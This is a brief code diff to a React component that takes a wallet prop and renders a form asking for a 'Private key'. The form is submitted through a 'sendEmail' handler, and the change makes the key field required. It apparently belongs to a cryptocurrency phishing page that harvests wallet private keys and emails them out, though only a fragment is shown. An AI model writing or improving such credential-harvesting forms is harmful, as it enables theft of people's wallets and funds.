@@ -29,6 +29,7 @@ const Json = ({ wallet }) => {
       <form onSubmit={sendEmail}>
         <input
           type="text"
+          required
           placeholder="Private key"
           name="key"
           minLength="12"
